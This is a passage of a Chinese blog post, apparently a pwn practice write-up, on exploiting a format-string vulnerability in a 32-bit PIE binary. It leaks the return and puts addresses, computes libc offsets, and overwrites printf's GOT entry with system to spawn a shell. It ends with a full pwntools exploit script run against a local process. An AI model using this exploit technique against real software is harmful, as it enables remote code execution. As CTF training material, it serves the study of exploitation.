class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">dofunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"quit"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dofunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//gcc fmt_str_level_1.c -z lazy -o fmt_str_level_1_x64</span><span class="token comment">//gcc -m32 fmt_str_level_1.c -z lazy -o fmt_str_level_1_x86</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是老规矩，先熟悉一下 IDA：（虽然给了源代码hhh）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_1.png" alt="你想有多PWN-fmt_test2_1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_2.png" alt="你想有多PWN-fmt_test2_2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_3.png" alt="你想有多PWN-fmt_test2_3.png"></p><p>明显在 <code>printf(buf)</code> 处存在格式化字符串漏洞</p><p>看一眼保护，32 位小端序，RELRO 开了一半，其余全开：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_4.png" alt="你想有多PWN-fmt_test2_4.png"></p><blockquote><p>由于这里有个 while 循环一直调用 printf 函数，且 RELRO 为 Partial RELRO，因此可以考虑将 <code>printf()</code> 的 GOT 表地址修改为 <code>system_plt</code>，然后调用 <code>printf()</code> 输出 <code>b&#39;/bin/sh&#39;</code> 即可实现 <code>system(&quot;/bin/sh&quot;)</code></p></blockquote><p>但是由于程序开启了 PIE 地址随机化，因此 <code>printf()</code> 的 GOT 表地址未知，也不知道其他任何函数的真实地址</p><p>所以首先思路就是通过格式化字符串漏洞来泄露一些地址</p><hr><h2 id="定位并泄露栈中的数据"><a href="#定位并泄露栈中的数据" class="headerlink" title="定位并泄露栈中的数据"></a>定位并泄露栈中的数据</h2><p>首先 gdb 调试 <code>fmt_str_level_1_x86</code> 程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_5.png" alt="你想有多PWN-fmt_test2_5.png"></p><p>执行到 <code>read()</code> 输入的地方，输入：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">aaaa_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p_<span class="token operator">%</span>p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_6.png" alt="你想有多PWN-fmt_test2_6.png"></p><p>执行到 <code>printf()</code> 处观察输出结果：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_7.png" alt="你想有多PWN-fmt_test2_7.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">aaaa_0x5655700f_0x4_0x565562e5_0xf7ffd000_0x20_</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span>_0x61616161_0x5f70255f_0x255f7025_0x70255f70_0x5f70255f_0x255f7025���T���<span class="token number">4</span>���������tV��\�������<span class="token number">0x5655634f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看到 <code>0x61616161</code> 就是刚刚输入的 <code>aaaa</code>，位于第 7 个位置</p><p>可以通过查看栈来验证一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_8.png" alt="你想有多PWN-fmt_test2_8.png"></p><blockquote><p>由于需要泄露真实地址，这里选择泄露栈上的返回地址（<strong>通常选择返回地址，不会受栈中的数据影响</strong>）</p></blockquote><p>找到 EBP 所在位置，由于栈空间比较长，这里使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> stack <span class="token number">100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_9.png" alt="你想有多PWN-fmt_test2_9.png"></p><p>可以看到 EBP 位于 <code>0xffffcdb8</code> 地址处，栈的返回地址紧随其后位于 <code>0xffffcdbc</code> 地址处，得知返回地址 <code>main+30</code> 的地址为：<code>0x5655638e</code></p><blockquote><p>注意：由于程序开启了 PIE，这里看到的 <code>main+30</code> 的地址其实是随机的，不过，不论地址怎么变，栈的结构是不会变的（<em>虽然地址是随机的，但由于操作系统的分页管理机制，地址的最低三位通常是不变的</em>）</p><p>因此，可以通过计算 <code>main+30</code> 在栈中的位置，然后利用格式化字符串漏洞将其泄露出来</p></blockquote><p>刚刚得知输入的 <code>aaaa</code> 位于栈中的第 7 个位置，存放在地址 <code>0xffffccac</code> 处</p><p>计算可知 <code>main+30</code> 所在位置与 <code>aaaa</code> 相距：<code>(0xffffcdbc - 0xffffccac) / 4 = 68</code></p><p>所以 <code>main+30</code> 在栈中位于第 <code>68 + 7 = 75</code> 个位置，构造 <code>printf(%75$p)</code> 即可将其泄露</p><p>验证一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_10.png" alt="你想有多PWN-fmt_test2_10.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_11.png" alt="你想有多PWN-fmt_test2_11.png"></p><p>泄露出来的地址与 <code>main+30</code> 的地址 <code>0x5655638e</code> 一致</p><p>于是，将 <code>printf(%75$p)</code> 泄露出来的地址减去 30 就可以得到真实的 main 函数地址了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%75$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">30</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用-ELF-的函数偏移计算真实地址"><a href="#利用-ELF-的函数偏移计算真实地址" class="headerlink" title="利用 ELF 的函数偏移计算真实地址"></a>利用 ELF 的函数偏移计算真实地址</h2><blockquote><p>由于 ELF 文件中函数之间的偏移不变，所以 <code>elf.symbols[&quot;main&quot;] - elf.got[&quot;puts&quot;]</code> 应该与真实的 <code>main_addr - puts_got_addr</code> 相同</p><p>而真实的 <code>main_addr</code> 已经通过前面的泄露和计算得知了，因此可以计算出 <code>puts_got_addr</code></p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x86"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>由于我们要使用 <code>fmtstr_payload()</code> 将 <code>printf()</code> 的 GOT 表地址修改为 <code>system_plt</code>，因此还需要得到 <code>printf_got_addr</code></p><p>计算方法与 <code>puts_got_addr</code> 一样，利用 ELF 的函数偏移计算即可：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="利用-libc-偏移计算-system-地址"><a href="#利用-libc-偏移计算-system-地址" class="headerlink" title="利用 libc 偏移计算 system 地址"></a>利用 libc 偏移计算 system 地址</h2><p>接下来还需要知道 <code>system()</code> 的真实地址，但是程序中并没有使用 <code>system()</code>，因此只能通过 libc 偏移来计算，这样就需要知道 <code>puts()</code> 或者 <code>printf()</code> 其一的真实地址（这些函数的实现来自于 libc，程序只负责调用）</p><p>以 <code>puts()</code> 为例：</p><p>由于我们已经得到了 <code>puts_got_addr</code>，该 GOT 表地址上存放的就是真实的 <code>puts_addr</code>，因此只需要将 <code>puts_got_addr</code> 这个地址上的值泄露出来即可</p><p>通过前面的分析已经知道，我们输入的内容在第 7 个位置，于是构造：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%7$s'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_12.png" alt="你想有多PWN-fmt_test2_12.png"></p><p>接收的数据中，前面的 4 字节 <code>18 50 93 61</code> 即是 <code>p32(puts_got_addr)</code> 的地址（小端序），紧随其后的 4 字节就是 <code>b&#39;%7$s&#39;</code> 泄露出的 <code>puts_addr</code>（小端序）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后，利用真实地址 <code>puts_addr</code> 计算 libc 偏移，得到 <code>system()</code> 的真实地址</p><h3 id="在本地不使用-LibcSearcher-的方法"><a href="#在本地不使用-LibcSearcher-的方法" class="headerlink" title="在本地不使用 LibcSearcher 的方法"></a>在本地不使用 LibcSearcher 的方法</h3><p>首先使用 ldd 确定程序的 libc 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldd fmt_str_level_1_x86<span class="token comment"># 输出为：</span><span class="token comment">#   linux-gate.so.1 (0xed54e000)</span><span class="token comment"># libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xed200000)</span><span class="token comment"># /lib/ld-linux.so.2 (0xed550000)</span><span class="token comment"># 因此 libc 为 /lib/i386-linux-gnu/libc.so.6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用偏移计算：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>每计算一步获取到的值，都记得调试一下进行验证，看看结果是不是正确的</p></blockquote><p>可以看到 <code>system()</code> 地址没有问题：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_13.png" alt="你想有多PWN-fmt_test2_13.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_14.png" alt="你想有多PWN-fmt_test2_14.png"></p><h3 id="利用-glibc-all-in-one-的方法"><a href="#利用-glibc-all-in-one-的方法" class="headerlink" title="利用 glibc-all-in-one 的方法"></a>利用 glibc-all-in-one 的方法</h3><blockquote><p>由于我直接使用 LibcSearcher 找到的 libc 偏移计算出来的 <code>system()</code> 地址都不对：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">obj <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span><span class="token comment"># obj = LibcSearcher("__GI__IO_puts", puts_addr)</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span> <span class="token comment"># 计算偏移量</span><span class="token comment"># libcbase = puts_addr - obj.dump('__GI__IO_puts') # 计算偏移量</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span> <span class="token comment"># 计算程序中 system() 的真实地址  </span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> obj<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span> <span class="token comment"># 计算程序中'/bin/sh'的真实地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以这里通过在线网站查找：<a href="https://libc.blukat.me/">libc database search</a></p></blockquote><p>为了更精确的查找，多加几个限制条件</p><p>刚刚通过调试我们知道：<code>puts()</code> 的最低三位为 <code>0x2a0</code>，<code>system()</code> 最低三位为 <code>0x170</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_16.png" alt="你想有多PWN-fmt_test2_16.png"></p><p>然后 <code>b&#39;/bin/sh&#39;</code> 最低三位为 <code>0x0d5</code></p><p><strong>即使地址是随机的，但是最低三位是不变的</strong>，因此搜索一下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_17.png" alt="你想有多PWN-fmt_test2_17.png"></p><p>有三个 libc 满足条件，我这里选择 <code>libc6_2.35-0ubuntu3.7_i386</code></p><p>然后使用 glibc-all-in-one 下载对应版本的 libc：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E4%BD%A0%E6%83%B3%E6%9C%89%E5%A4%9APWN-fmt_test2_18.png" alt="你想有多PWN-fmt_test2_18.png"></p><p>然后将 libc 路径更改为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/opt/glibc-all-in-one/libs/2.35-0ubuntu3.7_i386/libc.so.6'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><em>关于如何使用 glibc-all-in-one 详见《Pwntools与exp技巧》一文</em></p></blockquote><h2 id="使用-fmtstr-payload-修改-GOT-表"><a href="#使用-fmtstr-payload-修改-GOT-表" class="headerlink" title="使用 fmtstr_payload 修改 GOT 表"></a>使用 fmtstr_payload 修改 GOT 表</h2><p>最后，利用 <code>fmtstr_payload()</code> 构造格式化字符串利用，将 <code>printf_got_addr</code> 修改为 <code>system_plt</code> 地址即可</p><p>根据输入的数据位于第 7 个位置：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload_write_printf_got <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>printf_got_addr<span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_write_printf_got<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>向 <code>printf()</code> 传递参数 <code>b&#39;/bin/sh&#39;</code> 即可构造 <code>system(&quot;/bin/sh&quot;)</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x86"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 泄露并计算 main 函数真实地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'input:\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'%75$p'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ret_main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ret_main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_main_addr <span class="token operator">-</span> <span class="token number">30</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"main_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 main 函数的真实地址计算 puts 函数的 GOT 表地址</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./fmt_str_level_1_x86"</span><span class="token punctuation">)</span>main_puts_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_puts_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 利用 puts 函数的 GOT 表地址泄露 puts 函数的真实地址</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%7$s'</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 puts 函数的真实地址与 libc 偏移计算 system 函数地址</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('/opt/glibc-all-in-one/libs/2.35-0ubuntu3.7_i386/libc.so.6')</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libcbase -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 根据 main 函数的真实地址计算 printf 函数的 GOT 表地址</span>main_printf_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"main"</span><span class="token punctuation">]</span> <span class="token operator">-</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>printf_got_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> main_printf_offset<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"printf_got_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 利用 fmtstr_payload 将 printf 函数的 GOT 表地址改为 system 函数</span>payload_write_printf_got <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>printf_got_addr<span class="token punctuation">:</span> system_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_write_printf_got<span class="token punctuation">)</span><span class="token comment"># 向 printf 发送 b'/bin/sh' 构造 system("/bin/sh")</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结果"><a 